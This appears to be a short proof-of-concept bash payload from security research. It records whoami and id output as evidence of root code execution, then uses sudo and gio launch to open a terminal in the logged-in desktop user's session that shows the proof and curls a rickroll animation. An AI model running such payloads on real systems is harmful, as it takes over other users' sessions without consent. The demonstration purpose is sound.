#!/bin/bash

# prove root code execution
(echo "whoami: $(whoami)" && echo "id: $(id)") | tee /tmp/proof.txt

# will run on the users screen
cat > /tmp/rickroll.desktop << EOF
[Desktop Entry]
Version=1.0
Name=Hello
Exec=/bin/bash -c "ls -lpah /tmp/proof.txt && cat /tmp/proof.txt && sleep 10 && curl ascii.live/rick"
Terminal=true
Type=Application
EOF


# get the username of normal user with tty1
tty_user=$(stat -c%U /dev/tty1)

sudo -u $tty_user -i /bin/bash -l -c 'XDG_RUNTIME_DIR=/run/user/$UID WAYLAND_DISPLAY=wayland-0 gio launch /tmp/rickroll.desktop'
